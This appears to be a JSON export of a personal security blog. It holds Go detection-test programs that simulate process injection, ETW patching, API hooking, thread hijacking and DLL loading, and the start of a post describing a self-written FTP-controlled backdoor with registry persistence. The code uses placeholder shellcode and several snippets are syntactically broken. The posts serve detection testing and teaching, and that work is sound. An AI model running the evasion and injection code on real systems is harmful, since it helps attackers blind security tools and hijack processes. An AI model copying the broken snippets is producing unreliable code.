of this test is alterCallStack(), where a trampoline function is used to alter the call stack. trampolines are used to change the execution flow (\u0026ldquo;jumping\u0026rdquo;) to conceal the origin of a malicious call.\nfunc main() { Endpoint.Say(\u0026#34;[+] Starting Call Stack Spoofing via Synthetic Frames [+]\u0026#34;) Endpoint.Start(test, cleanup) } func test() { proc.Handle := windows.Handle(0) remoteProcHandle := windows.Handle(0) var err error // start process cmd := exec.Command(\u0026#34;notepad.exe\u0026#34;) err = cmd.Start() if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;failed to start process: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } defer cmd.Process.Kill() // get process handle procHandle, err = windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, uint32(cmd.Process_Pid)) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;failed to get process handle: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } // allocate memory to target process var remoteAddr uintptr remoteAddr, err = windows.VirtualAllocEx(procHandle, 0, 4096, windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to allocate memory: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } // write shellcode to allocated memory shellcode := []byte{0x90, 0x90, 0x90, 0x90} // NOP slide placeholder var written uint32 err = windows.WriteProcessMemory(procHandle, remoteAddr, \u0026amp;shellcode[0], uint32(len(shellcode)), \u0026amp;written) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to write to process memory: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } // create remote thread in target process var threadHandle windows.Handle threadHandle, err = windows.CreateRemoteThread(procHandle, nil, 0, remoteAddr, 0, 0, nil) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to create remote thread: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } defer windows.CloseHandle(threadHandle) // alter call stack alterCallStack() Endpoint.Say(\u0026#34;[+] Call stack spoofing executed successfully\u0026#34;) Endpoint.Stop(101) // UNPROTECTED: Malicious behavior not blocked } func alterCallStack() { // altering stack using trampoline function trampoline := syscall.NewCallback(func() uintptr { // jump to real target func return 0 }) // allocate memory to trampoline func mem, err := windows.VirtualAlloc(0, 4096, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to allocate memory for trampoline: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } // write trampoline to allocated memory trampolineAddr := (uintptr)(unsafe.Pointer(trampoline)) trampolineSize := uintptr(unsafe.Sizeof(trampoline)) copy((*(*[1 \u0026lt;\u0026lt; 20]byte)(unsafe.Pointer(mem)))[:], (*(*[1 \u0026lt;\u0026lt; 20]byte)(unsafe.Pointer(trampolineAddr)))[:trampolineSize]) // call trampoline to alter call stack syscall.Syscall(trampolineAddr, 0, 0, 0, 0) } func cleanup() { Endpoint.Say(\u0026#34;[+] Cleanup completed successfully\u0026#34;) Endpoint.Stop(100) // PROTECTED } evasion via event tracing for windows patching ETW patching is when the Event Tracing for Windows (ETW) is disabled/modified. ETW is a key feature in Windows, used to log + trace events within the OS. by patching ETW, security tools can be prevented from logging malicious activity and attackers can evade detection.\nthe test first allocates memory within the target process and simulates patching ETW-related functions inside ntdll.dll. it replaces these functions with a simple RET, effectively disabling ETW logging for certain events.\nit also includes a verification step to ensure that the patch was applied successfully, indicating an attempt to disable ETW.\nfunc main() { Endpoint.Say(\u0026#34;[+] Starting Evasion via Event Tracing for Windows Patching [+]\u0026#34;) Endpoint.Start(test, cleanup) } func test() { procHandle := windows.Handle(0) var err error // start process cmd := exec.Command(\u0026#34;notepad.exe\u0026#34;) err = cmd.Start() if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to start process: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } defer cmd.Process.Kill() // get process handle procHandle, err = windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, uint32(cmd.Process.Pid)) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to get process handle: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } // allocate memory in target var remoteAddr uintptr remoteAddr, err = windows.VirtualAllocEx(procHandle, 0, 4096, windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to allocate memory: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } // write dummy data to allocate memory [NOP slide to simulate patching] dummyData := []byte{0x90, 0x90, 0x90, 0x90} var written uint32 err = windows.WriteProcessMemory(procHandle, remoteAddr, \u0026amp;dummyData[0], uint32(len(dummyData)), \u0026amp;written) if err != nil || written != uint32(len(dummyData)) { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to write to process memory: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } // Verify the memory was patched verifyMemoryPatch(procHandle, remoteAddr, dummyData) // Attempt to patch ETW functions patchETW() Endpoint.Say(\u0026#34;[+] ETW patching executed successfully\u0026#34;) Endpoint.Stop(101) // UNPROTECTED: Malicious behavior not blocked } func patchETW() { // patching ETW functions in ntdll.dll ntdll := windows.NewLazySystemDLL(\u0026#34;ntdll.dll\u0026#34;) etwEventWrite := ntdll.NewProc(\u0026#34;EtwEventWrite\u0026#34;) // allocate memory for patch mem, err := windows.VirtualAlloc(0, 4096, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to allocate memory for ETW patch: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } // write patch to memory patch := []byte{0xC3} // RET instruction to bypass function copy((*(*[1 \u0026lt;\u0026lt; 20]byte)(unsafe.Pointer(mem)))[:], patch) // patch EtwEventWrite err = windows.WriteProcessMemory(windows.CurrentProcess(), etwEventWrite.Addr(), \u0026amp;patch[0], uintptr(len(patch)), nil) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to patch EtwEventWrite: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } } func verifyMemoryPatch(procHandle windows.Handle, remoteAddr uintptr, expectedData []byte) { buffer := make([]byte, len(expectedData)) var read uint32 err := windows.ReadProcessMemory(procHandle, remoteAddr, \u0026amp;buffer[0], uint32(len(buffer)), \u0026amp;read) if err != nil || read != uint32(len(buffer)) || !compareBuffers(buffer, expectedData) { Endpoint.Say(\u0026#34;[-] Memory patch verification failed\u0026#34;) Endpoint.Stop(1) // ERROR } Endpoint.Say(\u0026#34;[+] Memory patch verification succeeded\u0026#34;) } func compareBuffers(buf1, buf2 []byte) bool { if len(buf1) != len(buf2) { return false } for i := range buf1 { if buf1[i] != buf2[i] { return false } } return true } func cleanup() { Endpoint.Say(\u0026#34;[+] Cleanup completed successfully\u0026#34;) Endpoint.Stop(100) // PROTECTED } remote thread context manipulation attackers can modify the execution context of a thread in a remote process, allowing them to execute arbitrary code within the process. this happens a lot with process injection attacks.\nthe test first retrieves the context of the main thread of the target process and modifies its instruction pointer (RIP) to point to the address of injected shellcode. attackers can hijack threads to execute payloads this way.\nby changing the thread\u0026rsquo;s context, the test forces the process to execute the injected code, simulating the achievement of remote code execution.\nfunc main() { Endpoint.Say(\u0026#34;[+] Starting Remote Thread Context Manipulation [+]\u0026#34;) Endpoint.Start(test, cleanup) } func test() { // Start a target process to work with cmd := exec.Command(\u0026#34;notepad.exe\u0026#34;) err := cmd.Start() if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to start process: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } defer cmd.Process.Kill() // Get handle to the target process procHandle, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, uint32(cmd.Process.Pid)) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to get process handle: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } // main thread of target proc threadHandle, err := getMainThreadHandle(cmd.Process.Pid) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to get main thread handle: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } // manipulating thread context var context windows.Context context.ContextFlags = windows.CONTEXT_FULL err = windows.GetThreadContext(threadHandle, \u0026amp;context) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to get thread context: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } // change thread context: change instruction pointer to shellcode address context.Rip = uintptr(unsafe.Pointer(\u0026amp;dummyShellcode[0])) err = windows.SetThreadContext(threadHandle, \u0026amp;context) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to set thread context: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } Endpoint.Say(\u0026#34;[+] Remote thread context manipulation executed successfully\u0026#34;) Endpoint.Stop(101) // UNPROTECTED: Malicious behavior not blocked } func getMainThreadHandle(pid int) (windows.Handle, error) { var snapshot windows.Handle var entry windows.ThreadEntry32 // take snapshot of specified processes // snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0) if err != nil { return 0, err } defer windows.CloseHandle(snapshot) entry.Size = uint32(unsafe.Sizeof(entry)) // retrieve info about first thread of process from snapshot err = windows.Thread32First(snapshot, \u0026amp;entry) if err != nil { return 0, err } for { if entry.OwnerProcessID == uint32(pid) { threadHandle, err := windows.OpenThread(windows.THREAD_ALL_ACCESS, false, entry.ThreadID) if err != nil { return 0, err } return threadHandle, nil } err = windows.Thread32Next(snapshot, \u0026amp;entry) if err != nil { break } } return 0, fmt.Errorf(\u0026#34;no main thread found for process %d\u0026#34;, pid) } var dummyShellcode = []byte { 0x90, 0x90, 0x90, 0x90 } func cleanup() { Endpoint.Say(\u0026#34;[+] Cleanup completed successfully\u0026#34;) Endpoint.Stop(100) // PROTECTED } suspicious windows NT API hooking API hooking is an attack where the behaviour of system APIs is intercepted and modified. by hooking APIs, attackers strive to alter the way system calls (syscalls) behave, usually to inject payloads or evade detection. hooking critical system APIs subverts normal system operations, and is used in a lot of attacks.\nthe test first hooks several sensitive NT APIs related to memory management and section mapping. this is done by writing a JMP instruction to redirect the API calls to a custom function, simulating how attackers might hijack the APIs.\nthe test then dynamically resolves the addresses of these APIs, which is crucial in identifying and hooking specific functions in a live system.\nvar ntdll = windows.NewLazyDLL(\u0026#34;ntdll.dll\u0026#34;) func main() { Endpoint.Say(\u0026#34;[+] Starting Suspicious Windows NT API Hooking [+]\u0026#34;) Endpoint.Start(test, cleanup) } func test() { // define NT API functions to hook hookAPIs := []string{ \u0026#34;ZwCreateSection\u0026#34;, \u0026#34;NtCreateSection\u0026#34;, \u0026#34;ZwOpenSection\u0026#34;, \u0026#34;NtOpenSection\u0026#34;, \u0026#34;ZwClose\u0026#34;, \u0026#34;NtClose\u0026#34;, \u0026#34;ZwMapViewOfSection\u0026#34;, \u0026#34;NtMapViewOfSection\u0026#34;, \u0026#34;ZwUnmapViewOfSection\u0026#34;, \u0026#34;NtUnmapViewOfSection\u0026#34;, } // load ntdll + get addresses of APIs for _, api := range hookAPIs { proc := ntdll.NewProc(api) addr := proc.Addr() Endpoint.Say(fmt.Sprintf(\u0026#34;[+] Address of %s: 0x%X\u0026#34;, api, addr)) // hook API by writing JMP instruction to custom function hookAPI(addr) } Endpoint.Say(\u0026#34;hooked all specified NT APIs\u0026#34;) Endpoint.Stop(101) // UNPROTECTED: Malicious behavior not blocked } func hookAPI(addr uintptr) { // JMP to custom function jmp := []byte{0xE9, 0x00, 0x00, 0x00, 0x00} // JMP rel32 relAddr := uintptr(unsafe.Pointer(\u0026amp;customFunction)) - (addr + uintptr(len(jmp))) *(*uintptr)(unsafe.Pointer(\u0026amp;jmp[1])) = relAddr // write JMP to target API address var oldProtect uint32 err := windows.VirtualProtect(addr, uintptr(len(jmp)), windows.PAGE_EXECUTE_READWRITE, \u0026amp;oldProtect) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to change memory protection: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } _, err = windows.WriteProcessMemory(windows.CurrentProcess(), addr, \u0026amp;jmp[0], uintptr(len(jmp)), nil) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to write memory: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } err = windows.VirtualProtect(addr, uintptr(len(jmp)), oldProtect, \u0026amp;oldProtect) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to restore memory protection: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } } func customFunction() { // Custom function to be called by the hooked APIs Endpoint.Say(\u0026#34;[+] Custom function called by hooked API\u0026#34;) } func cleanup() { Endpoint.Say(\u0026#34;[+] Cleanup completed successfully\u0026#34;) Endpoint.Stop(100) // PROTECTED } .NET COM object creation in non-standard windows script interpreter attackers can create .NET COM objects from within non-standard script interpreters (like VBScript) to execute arbitrary Win32 APIs. scripting languages can be used to execute .NET code and used to achieve similar ends as a more conventional binary payload, which is easily detected.\nthe test runs a VBScript that attempts to launch notepad.exe. attackers use a script to bootstrap the execution of more complex code.\nthen, the creation of a .NET COM object and the execution of shellcode within the context of the script is simulated.\nvar scriptPath = \u0026#34;C:\\\\Windows\\\\Temp\\\\suspiciousScript.vbs\u0026#34; func main() { Endpoint.Say(\u0026#34;[+] Starting .NET COM object created in non-standard Windows Script Interpreter [+]\u0026#34;) Endpoint.Start(test, cleanup) } func test() { // create new VBS script file scriptContent := ` Set obj = CreateObject(\u0026#34;WScript.Shell) obj.Run \u0026#34;notepad.exe\u0026#34; ` err := os.WriteFile(scriptPath, []byte(scriptContent), 0644) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to create script file: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } Endpoint.Say(\u0026#34;[+] VBS script file created\u0026#34;) // execute VBS script with wscript.exe cmd := exec.Command(\u0026#34;wscript.exe\u0026#34;, scriptPath) err = cmd.Start() if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to execute script: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } Endpoint.Say(\u0026#34;[+] Script executed successfully\u0026#34;) // Simulate .NET COM object creation and suspicious API call simulateDotNetCOMObjectCreation() Endpoint.Stop(101) // UNPROTECTED: Malicious behavior not blocked } func simulateDotNetCOMObjectCreation() { // Simulate the creation of a .NET COM object in an unexpected script interpreter // Allocate executable memory kernel32 := windows.NewLazyDLL(\u0026#34;kernel32.dll\u0026#34;) procVirtualAlloc := kernel32.NewProc(\u0026#34;VirtualAlloc\u0026#34;) addr, _, err := procVirtualAlloc.Call(0, uintptr(4096), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE) if addr == 0 { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] VirtualAlloc failed: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } Endpoint.Say(\u0026#34;[+] VirtualAlloc executed successfully\u0026#34;) // Write shellcode to allocated memory shellcode := []byte{0x90, 0x90, 0x90, 0x90} // NOP instructions (for demonstration) procWriteProcessMemory := kernel32.NewProc(\u0026#34;WriteProcessMemory\u0026#34;) processHandle, err := windows.GetCurrentProcess() if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to get current process handle: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } var written uintptr ret, _, err := procWriteProcessMemory.Call(uintptr(processHandle), addr, uintptr(unsafe.Pointer(\u0026amp;shellcode[0])), uintptr(len(shellcode)), uintptr(unsafe.Pointer(\u0026amp;written))) if ret == 0 { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] WriteProcessMemory failed: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } Endpoint.Say(\u0026#34;[+] WriteProcessMemory executed successfully\u0026#34;) } func cleanup() { // Remove the created script file err := os.Remove(scriptPath) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to remove script file: %s\u0026#34;, err)) Endpoint.Stop(103) // Cleanup failed } Endpoint.Say(\u0026#34;[+] Script file removed\u0026#34;) Endpoint.Stop(100) // PROTECTED } potential browser exploit via fake RPC messages this is an attack where specially crafted RPC (Remote Procedure Call) messages are sent to exploit vulnerabilities in web browsers. this can be used to bypass CFG (Control Flow Guard) mitigations, which prevent execution of arbitrary code.\nthe test first launches several common web browsers and allocates memory in their address spaces. it then writes shellcode to this memory and attempts to execute it via manipulated RPC calls.\nit simulates the CFG bypass by exploiting a vulnerability in RPC message handling, specifically NdrServerCall2, which has been used in irl exploits.\nfunc main() { Endpoint.Say(\u0026#34;[+] Starting Potential Browser Exploit via Fake RPC Messages [+]\u0026#34;) Endpoint.Start(test, cleanup) } func test() { browserProcesses := []string{\u0026#34;chrome.exe\u0026#34;, \u0026#34;msedge.exe\u0026#34;, \u0026#34;iexplore.exe\u0026#34;, \u0026#34;brave.exe\u0026#34;, \u0026#34;whale.exe\u0026#34;, \u0026#34;browser.exe\u0026#34;, \u0026#34;dragon.exe\u0026#34;, \u0026#34;vivaldi.exe\u0026#34;, \u0026#34;opera.exe\u0026#34;, \u0026#34;seamonkey.exe\u0026#34;, \u0026#34;safari.exe\u0026#34;, \u0026#34;waterfox.exe\u0026#34;} for _, processName := range browserProcesses { cmd := exec.Command(processName) err := cmd.Start() if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to start process %s: %s\u0026#34;, processName, err)) continue } defer cmd.Process.Kill() // memory manipulation with VirtualProtect + WriteProcessMemory procHandle, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, uint32(cmd.Process.Pid)) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to get process handle: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } // allocate memory in target process addr, err := windows.VirtualAllocEx(procHandle, 0, 4096, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to allocate memory: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } // write shellcode to allocated memory shellcode := []byte{0x90, 0x90, 0x90, 0x90} // NOP sled as a placeholder var written uint32 err = windows.WriteProcessMemory(procHandle, addr, \u0026amp;shellcode[0], uint32(len(shellcode)), \u0026amp;written) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to write memory: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } // change memory protection to EXECUTABLE oldProtect := windows.PAGE_READWRITE err = windows.VirtualProtectEx(procHandle, addr, 4096, windows.PAGE_EXECUTE_READ, \u0026amp;oldProtect) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to change memory protection: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } // call NdrServerCall2 // this component handles RPC requests + dispatches them to function pointers // has been exploited to bypass CFG // attacker replaced DOM vtable pointer with NdrServerCall2 -\u0026gt; bypassing CFG check _, err = syscall.GetProcAddress(windows.NewLazyDLL(\u0026#34;rpcrt4.dll\u0026#34;).Handle(), \u0026#34;NdrServerCall2\u0026#34;) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to find NdrServerCall2: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } Endpoint.Say(\u0026#34;[+] Simulated RPC function call with memory manipulation\u0026#34;) } Endpoint.Say(\u0026#34;[+] Potential browser exploit via fake RPC messages executed successfully\u0026#34;) Endpoint.Stop(101) // UNPROTECTED: Malicious behavior not blocked } func cleanup() { Endpoint.Say(\u0026#34;[+] Cleanup completed successfully\u0026#34;) Endpoint.Stop(100) // PROTECTED } suspicious API from an unsigned service DLL here, the attacker loads a malicious, unsigned DLL into a service process like svchost.exe (a critical system process), then uses that DLL to execute suspicious APIs. this is often used to maintain persistence or for privilege escalation.\nthe test creates an unsigned DLL and attempts to load it into svchost.exe. after loading the DLL, the test simulates suspicious API calls (WriteProcessMemory, VirtualProtectEx), which are usually used to modify the memory of other process or to change permissions on executable code.\nvar serviceDLLPath = \u0026#34;C:\\\\Windows\\\\Temp\\\\suspicious.dll\u0026#34; func main() { Endpoint.Say(\u0026#34;[+] Starting Suspicious API from an Unsigned Service DLL [+]\u0026#34;) Endpoint.Start(test, cleanup) } func test() { // create new unsigned DLL dllContent := []byte(\u0026#34;test DLL file\u0026#34;) err := os.WriteFile(serviceDLLPath, dllContent, 0644) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to create DLL file: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } Endpoint.Say(\u0026#34;[+] Unsigned DLL file created\u0026#34;) // load DLL into svchost.exe cmd := exec.Command(\u0026#34;rundll32.exe\u0026#34;, serviceDLLPath+\u0026#34;,ServiceMain\u0026#34;) err = cmd.Start() if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to load DLL into svchost.exe: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } Endpoint.Say(\u0026#34;[+] DLL loaded into svchost.exe\u0026#34;) time.Sleep(3 * time.Second) // Simulate suspicious API calls simulateSuspiciousAPICalls() Endpoint.Stop(101) // UNPROTECTED: Malicious behavior not blocked } func simulateSuspiciousAPICalls() { // WriteProcessMemory call var kernel32 = windows.NewLazySystemDLL(\u0026#34;kernel32.dll\u0026#34;) var procWriteProcessMemory = kernel32.NewProc(\u0026#34;WriteProcessMemory\u0026#34;) processHandle, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false. uint32(os.Getpid())) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to open process: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } var written uint32 buffer := []byte(\u0026#34;memorywrite\u0026#34;) addr := uintptr(0x00000001) ret, _, err := procWriteProcessMemory.Call(uintptr(processHandle), addr, uintptr(unsafe.Pointer(\u0026amp;buffer[0])), uintptr(len(buffer)), uintptr(unsafe.Pointer(\u0026amp;written))) if ret == 0 { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] WriteProcessMemory failed: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } Endpoint.Say(\u0026#34;[+] WriteProcessMemory executed successfully\u0026#34;) // Simulate VirtualProtectEx call var oldProtect uint32 addr = uintptr(0x00000001) size := uintptr(1024) newProtect := uint32(windows.PAGE_EXECUTE_READWRITE) ret, _, err = syscall.Syscall6(procWriteProcessMemory.Addr(), 5, uintptr(processHandle), addr, size, uintptr(newProtect), uintptr(unsafe.Pointer(\u0026amp;oldProtect)), 0) if ret == 0 { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] VirtualProtectEx failed: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } Endpoint.Say(\u0026#34;[+] VirtualProtectEx executed successfully\u0026#34;) } func cleanup() { // Remove the created DLL file err := os.Remove(serviceDLLPath) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to remove DLL file: %s\u0026#34;, err)) Endpoint.Stop(103) // Cleanup failed } Endpoint.Say(\u0026#34;[+] DLL file removed\u0026#34;) Endpoint.Stop(100) // PROTECTED } suspicious kernel mode address manipulation attackers try to modify memory in the kernel space from a user mode process, which is an obvious attempt at privilege escalation. manipulating kernel memory can allow attackers to gain complete control over the system.\nthe test attempts to allocate memory in a kernel mode address range, which is normally inaccessible to user mode processes. attackers do this to exploit a vulnerability that can allow them to write to or execute code in the kernel space.\nthe test then tries to change the memory protection on the allocated kernel mode memory.\nfunc main() { Endpoint.Say(\u0026#34;[+] Starting Suspicious Kernel Mode Address Manipulation [+]\u0026#34;) Endpoint.Start(test, cleanup) } func test() { // Attempt to allocate and modify memory in a kernel mode address range kernelAddress := uintptr(0x1000000000000) // Example kernel mode address size := uintptr(1024) // Memory size oldProtect := uint32(0) newProtect := windows.PAGE_EXECUTE_READWRITE // Allocate memory at the kernel mode address addr, err := windows.VirtualAlloc(kernelAddress, size, windows.MEM_COMMIT|windows.MEM_RESERVE, newProtect) if err != nil || addr != kernelAddress { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to allocate memory at kernel mode address: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } Endpoint.Say(\u0026#34;[+] Successfully allocated memory at kernel mode address\u0026#34;) // Modify memory protection err = windows.VirtualProtect(kernelAddress, size, newProtect, \u0026amp;oldProtect) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to change memory protection at kernel mode address: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } Endpoint.Say(\u0026#34;[+] Successfully changed memory protection at kernel mode address\u0026#34;) // Write to the kernel mode address data := []byte{0x90, 0x90, 0x90, 0x90} // NOP instructions written := uint32(0) err = windows.WriteProcessMemory(windows.CurrentProcess(), kernelAddress, \u0026amp;data[0], uintptr(len(data)), \u0026amp;written) if err != nil || written != uint32(len(data)) { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] Failed to write to kernel mode address: %s\u0026#34;, err)) Endpoint.Stop(1) // ERROR } Endpoint.Say(\u0026#34;[+] Successfully wrote to kernel mode address\u0026#34;) Endpoint.Stop(101) // UNPROTECTED: Malicious behavior not blocked } func cleanup() { Endpoint.Say(\u0026#34;[+] Cleanup completed successfully\u0026#34;) Endpoint.Stop(100) // PROTECTED } conclusion i wanted to write code that was much more than just \u0026ldquo;simple\u0026rdquo; scripts. i wanted to write comprehensive tools that would help uncover and understand the more sophisticated and insidious aspects of modern threats. testing for techniques like process hollowing, API hooking, and kernel memory manipulation can hopefully offer some technical and educational value to my peers in the field, as i myself have gleaned from their learning and experience over the years.\nhappy hacking!\n","date":"2024-08-12","permalink":"//localhost:1313/posts/go-pro/","section":"","summary":"","tags":[],"title":"goPro: detecting process hollowing with Go"},{"categories":[],"contents":" ","date":"2024-04-10","permalink":"//localhost:1313/photography/new_post13/","section":"","summary":"","tags":[],"title":"ultramax 400 [eclipse in toronto]"},{"categories":[],"contents":" ","date":"2024-03-10","permalink":"//localhost:1313/photography/new_post12/","section":"","summary":"","tags":[],"title":"ultramax 400"},{"categories":[],"contents":" ","date":"2024-02-20","permalink":"//localhost:1313/photography/new_post14/","section":"","summary":"","tags":[],"title":"portra 800 [manitoba]"},{"categories":[],"contents":" ","date":"2024-01-25","permalink":"//localhost:1313/photography/new_post11/","section":"","summary":"","tags":[],"title":"portra 800 [toronto + manitoba]"},{"categories":[],"contents":" as part of a post-layoff glow-up, i began to delve deeper into programming and building my own tools. a lot of these tools are based on specific actions, like attacks, analysis, etc. one thing i\u0026rsquo;ve always been fascinated with though is object-oriented programming used to build applications from the ground up, specifically backdoors.\nbackdoors are often used for securing remote access to a computer. they\u0026rsquo;re used for legitimate purposes, like by system administrators for system management (fix issues, install updates, perform maintenance) without being physically present. however, one need only hop a short distance from legitimate purposes to malicious activities, as hackers often use backdoors to steal sensitive data, install additional malware, and launch attacks against other systems.\nso i wrote one myself.\nneverMind is a backdoor that allows remote command execution (aka RCE) on a target system via FTP (file transfer protocol). view the source code here and follow along!\noverview the gist of how neverMind works is simple: the program is controlled remotely via commands stored in text file on an FTP server. for this, 2 basic conditions need to be fulfilled:\nthe program needs an FTP server to be set up with a specific directory structure. inside this directory, there needs to be a file (named cmd.txt for example) that contains the commands to be executed.\nthe cmd.txt file needs to have each line representing a separate command. the program supports several commands: print, screen, upload, download, exec.\nflow initialization: the program begins by creating an instance of the neverMind class, which takes the FTP server\u0026rsquo;s host, username, and password as parameters. this instance is used to manage the backdoor\u0026rsquo;s operations.\nsetup: if the backdoor hasn\u0026rsquo;t been set up before, the setup method in the neverMind class creates the necessary directories and adds the backdoor to the registry for persistence.\ncommand execution: the start method in the neverMind class is the main driver of the program. it connects to the FTP server, downloads the cmd.txt file, compiles + executes the commands, and then uploads the output.txt file.\ncommand compilation: the compile method reads the cmd.txt file, splits each line into a vector of strings, and then executes each command.\ncommand handling: the execute method takes a vector of strings as input and executes the corresponding command. the supported commands are the same as above: print, screen, upload, download, exec.\nFTP operations: the neverMind class uses an instance of the ftpC class to handle FTP operations, including connecting to the server, uploading/downloading files, and creating/switching directories.\nutility functions: the wrapper class provides utility functions for file I/O, error handling, directory listing, random string generation, date retrieval, bitmap creation, screen capturing, and memory saving.\npersistence: the program adds itself to the registry to ensure it runs every time the system starts.\ncleanup: when the program is done, it closes the FTP + internet connections in the ftpC class destructor.\ncode the wrapper the wrapper class defined in wrapper.h and implemented in wrapper.cpp provides a set of utility functions for file operations, system information retrieval, and screen capture.\nfile operations read_file(const std::string\u0026amp; file_path): reads the content of a file located at file_path and returns it as a string. If the file cannot be opened, it throws a FileError exception.\nstd::string wrapper::read_file(const std::string \u0026amp;file_path) { std::ifstream file(file_path); if (!file.is_open()) throw FileError(\u0026#34;[!] failed to open file: \u0026#34; + file_path); std::string text; std::string line; while (std::getline(file, line)) { text += line + \u0026#34;\\n\u0026#34;; } return text; } write_file(const std::string\u0026amp; file_path, const std::string\u0026amp; content): writes content to a file located at file_path. if the file cannot be opened, it throws a FileError exception.\nvoid wrapper::write_file(const std::string \u0026amp;file_path, const std::string \u0026amp;content) { std::ofstream file(file_path); if (!file.is_open()) throw FileError(\u0026#34;[!] failed to open file: \u0026#34; + file_path); file \u0026lt;\u0026lt; content; } append_file(const std::string\u0026amp; file_path, const std::string\u0026amp; content): appends content to a file located at file_path. if the file cannot be opened, it throws a FileError exception.\nvoid wrapper::append_file(const std::string\u0026amp; file_path, const std::string\u0026amp; content) { std::ofstream file(file_path, std::ios_base::app); if (!file.is_open()) throw FileError(\u0026#34;[!] failed to open file: \u0026#34; + 